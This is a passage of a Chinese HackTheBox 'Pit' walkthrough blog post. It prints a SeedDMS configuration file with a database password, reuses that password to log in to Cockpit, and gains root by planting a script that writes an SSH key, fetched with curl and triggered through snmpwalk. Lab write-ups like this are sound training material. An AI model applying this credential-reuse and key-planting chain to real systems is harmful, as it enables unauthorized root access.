<span class="attr">maxItemsPerPage</span>=<span class="string">&quot;0&quot;</span> <span class="attr">incItemsPerPage</span>=<span class="string">&quot;0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- strictFormCheck: Strict form checking. If set to true, then all fields in the form will be checked for a value. If set to false, then (most) comments and keyword fields become optional. Comments are always required when submitting a review or overriding document status.</span></span><br><span class="line"><span class="comment">       - viewOnlineFileTypes: files with one of the following endings can be viewed online (USE ONLY LOWER CASE CHARACTERS)</span></span><br><span class="line"><span class="comment">       - enableConverting: enable/disable converting of files</span></span><br><span class="line"><span class="comment">       - enableEmail: enable/disable automatic email notification</span></span><br><span class="line"><span class="comment">       - enableUsersView: enable/disable group and user view for all users</span></span><br><span class="line"><span class="comment">       - enableFullSearch: false to don&#x27;t use fulltext search</span></span><br><span class="line"><span class="comment">       - enableLanguageSelector: false to don&#x27;t show the language selector after login</span></span><br><span class="line"><span class="comment">       - enableClipboard: false to hide the clipboard</span></span><br><span class="line"><span class="comment">       - enableFolderTree: false to don&#x27;t show the folder tree</span></span><br><span class="line"><span class="comment">       - expandFolderTree: 0 to start with tree hidden</span></span><br><span class="line"><span class="comment">       -                   1 to start with tree shown and first level expanded</span></span><br><span class="line"><span class="comment">       -                   2 to start with tree shown fully expanded     </span></span><br><span class="line"><span class="comment">       - stopWordsFile: path to stop word file for indexer</span></span><br><span class="line"><span class="comment">       - sortUsersInList: how to sort users in lists (&#x27;fullname&#x27; or &#x27;&#x27; (default))</span></span><br><span class="line"><span class="comment">    --&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">edition</span> <span class="attr">strictFormCheck</span>=<span class="string">&quot;false&quot;</span> <span class="attr">viewOnlineFileTypes</span>=<span class="string">&quot;.txt;.text;.html;.htm;.xml;.pdf;.gif;.png;.jpg;.jpeg&quot;</span> <span class="attr">enableConverting</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableEmail</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableUsersView</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableFullSearch</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableClipboard</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableFolderTree</span>=<span class="string">&quot;true&quot;</span> <span class="attr">expandFolderTree</span>=<span class="string">&quot;1&quot;</span> <span class="attr">enableLanguageSelector</span>=<span class="string">&quot;true&quot;</span> <span class="attr">stopWordsFile</span>=<span class="string">&quot;&quot;</span> <span class="attr">sortUsersInList</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableDropUpload</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableRecursiveCount</span>=<span class="string">&quot;false&quot;</span> <span class="attr">maxRecursiveCount</span>=<span class="string">&quot;0&quot;</span> <span class="attr">enableThemeSelector</span>=<span class="string">&quot;false&quot;</span> <span class="attr">fullSearchEngine</span>=<span class="string">&quot;sqlitefts&quot;</span> <span class="attr">sortFoldersDefault</span>=<span class="string">&quot;u&quot;</span> <span class="attr">editOnlineFileTypes</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableMenuTasks</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableHelp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">defaultSearchMethod</span>=<span class="string">&quot;database&quot;</span> <span class="attr">libraryFolder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">maxSizeForFullText</span>=<span class="string">&quot;0&quot;</span> <span class="attr">showSingleSearchHit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableSessionList</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableDropFolderList</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableMultiUpload</span>=<span class="string">&quot;false&quot;</span> <span class="attr">defaultDocPosition</span>=<span class="string">&quot;end&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edition</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- enableCalendar: enable/disable calendar</span></span><br><span class="line"><span class="comment">       - calendarDefaultView: calendar default view (&quot;w&quot; for week,&quot;m&quot; for month,&quot;y&quot; for year)</span></span><br><span class="line"><span class="comment">       - firstDayOfWeek: first day of the week (0=sunday, 6=saturday)</span></span><br><span class="line"><span class="comment">    --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">calendar</span> <span class="attr">enableCalendar</span>=<span class="string">&quot;true&quot;</span> <span class="attr">calendarDefaultView</span>=<span class="string">&quot;y&quot;</span> <span class="attr">firstDayOfWeek</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">calendar</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">webdav</span> <span class="attr">enableWebdavReplaceDoc</span>=<span class="string">&quot;true&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">site</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">system</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- rootDir: Path to where SeedDMS is located</span></span><br><span class="line"><span class="comment">       - httpRoot: The relative path in the URL, after the domain part. Do not include the</span></span><br><span class="line"><span class="comment">       -           http:// prefix or the web host name. e.g. If the full URL is</span></span><br><span class="line"><span class="comment">	     -           http://www.example.com/seeddms/, set $_httpRoot = &quot;/seeddms/&quot;.</span></span><br><span class="line"><span class="comment">	     -           If the URL is http://www.example.com/, set $_httpRoot = &quot;/&quot;.</span></span><br><span class="line"><span class="comment">       - contentDir: Where the uploaded files are stored (best to choose a directory that</span></span><br><span class="line"><span class="comment">       -             is not accessible through your web-server)</span></span><br><span class="line"><span class="comment">       - stagingDir: Where partial file uploads are saved</span></span><br><span class="line"><span class="comment">       - luceneDir: Where the lucene fulltext index iѕ saved</span></span><br><span class="line"><span class="comment">       - logFileEnable: set false to disable log system</span></span><br><span class="line"><span class="comment">       - logFileRotation: the log file rotation (h=hourly, d=daily, m=monthly)</span></span><br><span class="line"><span class="comment">       - enableLargeFileUpload: support for jumploader</span></span><br><span class="line"><span class="comment">       - partitionsize: size of chunk uploaded by jumploader</span></span><br><span class="line"><span class="comment">       - dropFolderDir: where files for document upload are located</span></span><br><span class="line"><span class="comment">       - cacheDir: where the preview images are saved</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span> <span class="attr">rootDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/seeddms/&quot;</span> <span class="attr">httpRoot</span>=<span class="string">&quot;/seeddms51x/seeddms/&quot;</span> <span class="attr">contentDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/&quot;</span> <span class="attr">stagingDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/staging/&quot;</span> <span class="attr">luceneDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/lucene/&quot;</span> <span class="attr">logFileEnable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">logFileRotation</span>=<span class="string">&quot;d&quot;</span> <span class="attr">enableLargeFileUpload</span>=<span class="string">&quot;false&quot;</span> <span class="attr">partitionSize</span>=<span class="string">&quot;2000000&quot;</span> <span class="attr">cacheDir</span>=<span class="string">&quot;/var/www/html/seeddms51x/data/cache/&quot;</span> <span class="attr">dropFolderDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">backupDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">repositoryUrl</span>=<span class="string">&quot;&quot;</span> <span class="attr">maxUploadSize</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableXsendfile</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- enableGuestLogin: If you want anybody to login as guest, set the following line to true</span></span><br><span class="line"><span class="comment">       -                   <span class="doctag">note:</span> guest login should be used only in a trusted environment</span></span><br><span class="line"><span class="comment">			 - enablePasswordForgotten: Allow users to reset their password</span></span><br><span class="line"><span class="comment">       - restricted: Restricted access: only allow users to log in if they have an entry in the local database (irrespective of successful authentication with LDAP).</span></span><br><span class="line"><span class="comment">       - enableUserImage: enable users images</span></span><br><span class="line"><span class="comment">       - disableSelfEdit: if true user cannot edit his own profile</span></span><br><span class="line"><span class="comment">			 - passwordStrength: minimum strength of password, set to 0 to disable</span></span><br><span class="line"><span class="comment">			 - passwordExpiration: number of days after password expires</span></span><br><span class="line"><span class="comment">			 - passwordHistory: number of remembered passwords</span></span><br><span class="line"><span class="comment">			 - passwordStrengthAlgorithm: algorithm used to calculate password strenght (simple or advanced)</span></span><br><span class="line"><span class="comment">			 - encryptionKey: arbitrary string used for creating identifiers</span></span><br><span class="line"><span class="comment">    --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">authentication</span> <span class="attr">enableGuestLogin</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enablePasswordForgotten</span>=<span class="string">&quot;false&quot;</span> <span class="attr">restricted</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableUserImage</span>=<span class="string">&quot;false&quot;</span> <span class="attr">disableSelfEdit</span>=<span class="string">&quot;false&quot;</span> <span class="attr">passwordStrength</span>=<span class="string">&quot;0&quot;</span> <span class="attr">passwordStrengthAlgorithm</span>=<span class="string">&quot;simple&quot;</span> <span class="attr">passwordExpiration</span>=<span class="string">&quot;10&quot;</span> <span class="attr">passwordHistory</span>=<span class="string">&quot;0&quot;</span> <span class="attr">loginFailure</span>=<span class="string">&quot;0&quot;</span> <span class="attr">autoLoginUser</span>=<span class="string">&quot;0&quot;</span> <span class="attr">quota</span>=<span class="string">&quot;0&quot;</span> <span class="attr">undelUserIds</span>=<span class="string">&quot;&quot;</span> <span class="attr">encryptionKey</span>=<span class="string">&quot;cfecb42d13f2e1666cddde56991a2cbf&quot;</span> <span class="attr">cookieLifetime</span>=<span class="string">&quot;0&quot;</span> <span class="attr">enableGuestAutoLogin</span>=<span class="string">&quot;false&quot;</span> <span class="attr">defaultAccessDocs</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">connectors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ***** CONNECTOR LDAP  *****</span></span><br><span class="line"><span class="comment">           - enable: enable/disable connector</span></span><br><span class="line"><span class="comment">           - type: type of connector ldap / AD</span></span><br><span class="line"><span class="comment">           - host: hostname of the authentification server</span></span><br><span class="line"><span class="comment">           -       URIs are supported, e.g.: ldaps://ldap.host.com</span></span><br><span class="line"><span class="comment">           - port: port of the authentification server</span></span><br><span class="line"><span class="comment">           - baseDN: top level of the LDAP directory tree</span></span><br><span class="line"><span class="comment">        --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">connector</span> <span class="attr">enable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">type</span>=<span class="string">&quot;ldap&quot;</span> <span class="attr">host</span>=<span class="string">&quot;ldaps://ldap.host.com&quot;</span> <span class="attr">port</span>=<span class="string">&quot;389&quot;</span> <span class="attr">baseDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">bindDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">bindPw</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ***** CONNECTOR Microsoft Active Directory  *****</span></span><br><span class="line"><span class="comment">           - enable: enable/disable connector</span></span><br><span class="line"><span class="comment">           - type: type of connector ldap / AD</span></span><br><span class="line"><span class="comment">           - host: hostname of the authentification server</span></span><br><span class="line"><span class="comment">           - port: port of the authentification server</span></span><br><span class="line"><span class="comment">           - baseDN: top level of the LDAP directory tree</span></span><br><span class="line"><span class="comment">           - accountDomainName: sample: example.com</span></span><br><span class="line"><span class="comment">        --&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">connector</span> <span class="attr">enable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">type</span>=<span class="string">&quot;AD&quot;</span> <span class="attr">host</span>=<span class="string">&quot;ldap.example.com&quot;</span> <span class="attr">port</span>=<span class="string">&quot;389&quot;</span> <span class="attr">baseDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">accountDomainName</span>=<span class="string">&quot;example.com&quot;</span> <span class="attr">bindDN</span>=<span class="string">&quot;&quot;</span> <span class="attr">bindPw</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">connectors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">authentication</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       - dbDriver: DB-Driver used by adodb (see adodb-readme)</span></span><br><span class="line"><span class="comment">       - dbHostname: DB-Server</span></span><br><span class="line"><span class="comment">       - dbDatabase: database where the tables for seeddms are stored (optional - see adodb-readme)</span></span><br><span class="line"><span class="comment">       - dbUser: username for database-access</span></span><br><span class="line"><span class="comment">       - dbPass: password for database-access</span></span><br><span class="line"><span class="comment">    --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">database</span> <span class="attr">dbDriver</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbHostname</span>=<span class="string">&quot;localhost&quot;</span> <span class="attr">dbDatabase</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbUser</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbPass</span>=<span class="string">&quot;ied^ieY6xoquu&quot;</span> <span class="attr">doNotCheckVersion</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- smtpServer: SMTP Server hostname</span></span><br><span class="line"><span class="comment">       - smtpPort: SMTP Server port</span></span><br><span class="line"><span class="comment">       - smtpSendFrom: Send from</span></span><br><span class="line"><span class="comment">    --&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">smtp</span> <span class="attr">smtpServer</span>=<span class="string">&quot;localhost&quot;</span> <span class="attr">smtpPort</span>=<span class="string">&quot;25&quot;</span> <span class="attr">smtpSendFrom</span>=<span class="string">&quot;seeddms@localhost&quot;</span> <span class="attr">smtpUser</span>=<span class="string">&quot;&quot;</span> <span class="attr">smtpPassword</span>=<span class="string">&quot;&quot;</span>/&gt;</span>    </span><br><span class="line">  <span class="tag">&lt;/<span class="name">system</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">advanced</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- siteDefaultPage: Default page on login. Defaults to out/out.ViewFolder.php</span></span><br><span class="line"><span class="comment">       - rootFolderID: ID of root-folder (mostly no need to change)</span></span><br><span class="line"><span class="comment">       - titleDisplay<span class="doctag">Hack:</span> Workaround for page titles that go over more than 2 lines.</span></span><br><span class="line"><span class="comment">    --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">display</span> <span class="attr">siteDefaultPage</span>=<span class="string">&quot;&quot;</span> <span class="attr">rootFolderID</span>=<span class="string">&quot;1&quot;</span> <span class="attr">titleDisplayHack</span>=<span class="string">&quot;true&quot;</span> <span class="attr">showMissingTranslations</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">display</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- guestID: ID of guest-user used when logged in as guest (mostly no need to change)</span></span><br><span class="line"><span class="comment">       - adminIP: if enabled admin can login only by specified IP addres, leave empty to avoid the control</span></span><br><span class="line"><span class="comment">       -          <span class="doctag">NOTE:</span> works only with local autentication (no LDAP)</span></span><br><span class="line"><span class="comment">    --&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">authentication</span> <span class="attr">guestID</span>=<span class="string">&quot;2&quot;</span> <span class="attr">adminIP</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">authentication</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- enableAdminRevApp: false to don&#x27;t list administrator as reviewer/approver</span></span><br><span class="line"><span class="comment">       - versioningFileName: the name of the versioning info file created by the backup tool</span></span><br><span class="line"><span class="comment">       - workflowMode: &#x27;traditional&#x27; or &#x27;advanced&#x27;</span></span><br><span class="line"><span class="comment">       - enableVersionDeletion: allow to delete versions after approval</span></span><br><span class="line"><span class="comment">       - enableVersionModification: allow to modify versions after approval</span></span><br><span class="line"><span class="comment">       - enableDuplicateDocNames: allow duplicate names in a folder</span></span><br><span class="line"><span class="comment">    --&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">edition</span> <span class="attr">enableAdminRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">versioningFileName</span>=<span class="string">&quot;versioning_info.txt&quot;</span> <span class="attr">workflowMode</span>=<span class="string">&quot;traditional&quot;</span> <span class="attr">enableVersionDeletion</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableVersionModification</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableDuplicateDocNames</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableOwnerRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableSelfRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">presetExpirationDate</span>=<span class="string">&quot;&quot;</span> <span class="attr">overrideMimeType</span>=<span class="string">&quot;false&quot;</span> <span class="attr">initialDocumentStatus</span>=<span class="string">&quot;0&quot;</span> <span class="attr">enableAcknowledgeWorkflow</span>=<span class="string">&quot;&quot;</span> <span class="attr">enableRevisionWorkflow</span>=<span class="string">&quot;&quot;</span> <span class="attr">advancedAcl</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableUpdateRevApp</span>=<span class="string">&quot;false&quot;</span> <span class="attr">removeFromDropFolder</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allowReviewerOnly</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edition</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- enableNotificationAppRev: true to send notifation if a user is added as a reviewer or approver</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">notification</span> <span class="attr">enableNotificationAppRev</span>=<span class="string">&quot;true&quot;</span> <span class="attr">enableOwnerNotification</span>=<span class="string">&quot;false&quot;</span> <span class="attr">enableNotificationWorkflow</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">notification</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- coreDir: Path to SeedDMS_Core (optional)</span></span><br><span class="line"><span class="comment">       - luceneClassDir: Path to SeedDMS_Lucene (optional)</span></span><br><span class="line"><span class="comment">       - contentOffsetDir: To work around limitations in the underlying file system, a new </span></span><br><span class="line"><span class="comment">       -                   directory structure has been devised that exists within the content </span></span><br><span class="line"><span class="comment">       -                   directory ($_contentDir). This requires a base directory from which </span></span><br><span class="line"><span class="comment">       -                   to begin. Usually leave this to the default setting, 1048576, but can </span></span><br><span class="line"><span class="comment">       -                   be any number or string that does not already exist within $_contentDir.	</span></span><br><span class="line"><span class="comment">       - maxDirID: Maximum number of sub-directories per parent directory. Default: 0, use 31998 (maximum number of dirs in ext3) for a multi level content directory.</span></span><br><span class="line"><span class="comment">       - updateNotifyTime: users are notified about document-changes that took place within the last &quot;updateNotifyTime&quot; seconds</span></span><br><span class="line"><span class="comment">       - extraPath: Path to addtional software. This is the directory containing additional software like the adodb directory, or the pear Log package. This path will be added to the php include path</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span> <span class="attr">coreDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">luceneClassDir</span>=<span class="string">&quot;&quot;</span> <span class="attr">contentOffsetDir</span>=<span class="string">&quot;1048576&quot;</span> <span class="attr">maxDirID</span>=<span class="string">&quot;0&quot;</span> <span class="attr">updateNotifyTime</span>=<span class="string">&quot;86400&quot;</span> <span class="attr">extraPath</span>=<span class="string">&quot;/var/www/html/seeddms51x/pear/&quot;</span> <span class="attr">maxExecutionTime</span>=<span class="string">&quot;30&quot;</span> <span class="attr">cmdTimeout</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">converters</span> <span class="attr">target</span>=<span class="string">&quot;fulltext&quot;</span>&gt;</span></span><br><span class="line">		 <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/pdf&quot;</span>&gt;</span>pdftotext -nopgbrk %s - | sed -e &#x27;s/ [a-zA-Z0-9.]\&#123;1\&#125; / /g&#x27; -e &#x27;s/[0-9.]//g&#x27;<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/msword&quot;</span>&gt;</span>catdoc %s<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/vnd.ms-excel&quot;</span>&gt;</span>ssconvert -T Gnumeric_stf:stf_csv -S %s fd://1<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;audio/mp3&quot;</span>&gt;</span>id3 -l -R %s | egrep &#x27;(Title|Artist|Album)&#x27; | sed &#x27;s/^[^:]*: //g&#x27;<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;audio/mpeg&quot;</span>&gt;</span>id3 -l -R %s | egrep &#x27;(Title|Artist|Album)&#x27; | sed &#x27;s/^[^:]*: //g&#x27;<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">converter</span> <span class="attr">mimeType</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span>cat %s<span class="tag">&lt;/<span class="name">converter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">converters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">advanced</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">extensions</span>&gt;</span><span class="tag">&lt;<span class="name">extension</span> <span class="attr">name</span>=<span class="string">&quot;example&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">extensions</span>&gt;</span><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中发现了数据库的账号密码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">database</span> <span class="attr">dbDriver</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbHostname</span>=<span class="string">&quot;localhost&quot;</span> <span class="attr">dbDatabase</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbUser</span>=<span class="string">&quot;seeddms&quot;</span> <span class="attr">dbPass</span>=<span class="string">&quot;ied^ieY6xoquu&quot;</span> <span class="attr">doNotCheckVersion</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是<code>/etc/passwd</code>中mysql为<code>/sbin/nologin</code>，解释如下：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If  the file /etc/nologin exists and is readable, login(1) will allow access only to root.</span><br><span class="line">Other users will be shown the contents of this file and  their  logins  will  be  refused.</span><br><span class="line">This provides a simple way of temporarily disabling all unprivileged logins.</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>就是禁止以账户的的方式登录，通常由许多需要账户但不想通过授予登陆访问权限而造成安全问题的系统服务器使用，那这里没法通过<strong>远程命令执行</strong>用数据库账号密码来查询数据了</p>
+<p>上面我们已经知道9090端口可以登录Cockpit，且<strong>root</strong>和<strong>michelle</strong>两个用户使用<code>/bin/bash</code>，结合Cockpit控制台的作用，我们尝试用<code>username:michelle/password:ied^ieY6xoquu</code>登录cockpit，成功登录！</p>
+<p>在<strong>Accounts</strong>中，发现确实存在<strong>root</strong>和<strong>michelle</strong>两个用户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_usertxt.png" alt="usertxt"></p>
+<p>用Cockpit自带的终端找到user.txt</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先用<code>sudo -l</code>列出目前用户可执行与无法执行的指令，发现<strong>michelle</strong>用户不能执行<code>sudo</code>命令，另寻他法</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pit_sudo-l.png" alt="sudo-l"></p>
+<p>回到snmp文件，发现<code>/usr/bin/monitor</code>,monitor是一个文件，用<code>cat</code>命令看看写了啥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B3%84%E9%9C%B2%E4%BF%A1%E6%81%AF3.png" alt="泄露信息3"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/monitor.png" alt="monitor"></p>
+<p>进入<code>/usr/local/monitoring</code>目录，可以看但我们只有<code>wx</code>权限。向目录写入一个脚本文件，<code>cat</code>以后成功输出了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E4%B8%8D%E5%8F%AF%E6%89%A7%E8%A1%8C.png" alt="不可执行"></p>
+<p>结合在<strong>Accounts</strong>中的发现，我们可以向<code>/root/.ssh</code>写入一个密钥来绕过SSH密码登录root账户</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/hint2.png" alt="hint2"></p>
+<p>在本地生成一对密钥，会产生<strong>xxx.pub</strong>和<strong>xxx</strong>两个文件</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/createkey.png" alt="createkey"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/publickey.png" alt="publickey"></p>
+<p>写一个shell脚本来写入我们的密钥</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/checkme.png" alt="checkme"></p>
+<p>在本地一起个web服务<code>python -m http.server 80</code>，并在Cockpit终端中用<code>curl</code>命令来获取本地的shell脚本，用<code>cat</code>执行脚本</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/writekey.png" alt="writekey"></p>
+<p>用snmpwalk加载所有内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects#-m MIB[:...]          load given list of MIBs (ALL loads everything)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/snmpcommand.png" alt="snmpcommand"></p>
+<p>接下来就可以用配对的密钥SSH连接root了，得到root.txt</p>
+<p>![ssh root](<a target="_blank" rel="noopener" href="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh">https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh</a> root.png)</p>
+<p>写入密钥并连接的操作需要连贯的完成，因为目标Linux会定时删除<code>/monitoring</code>目录下的文件</p>
+<p><strong>注意！！运行snmpwalk前需要安装配置好snmp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmpcpan -i NetAddr::IPapt-get install snmp-mibs-downloadersudo download-mibs</span><br></pre></td></tr></table></figure>
+
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>总的做下来是学到了新知识的，以后信息收集的时候也会注意更多小细节</p>
+<p>在SeedDMS版本漏洞利用的点上是官方设计的问题，有文章没解释就说这里应该用<strong>CVE-2019-12744的漏洞</strong>我觉得这是非常不负责任的一件事情，我们应该抱着质疑的态度而不是文章怎么写就照着做</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.poftut.com/snmpwalk-command-line-examples/">https://www.poftut.com/snmpwalk-command-line-examples/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dongwuming/article/details/9705595">https://blog.csdn.net/dongwuming/article/details/9705595</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/07/HackTheBox-Oopsie/" rel="prev" title="HackTheBox-Oopsie">
+                  <i class="fa fa-chevron-left"></i> HackTheBox-Oopsie
+                </a>
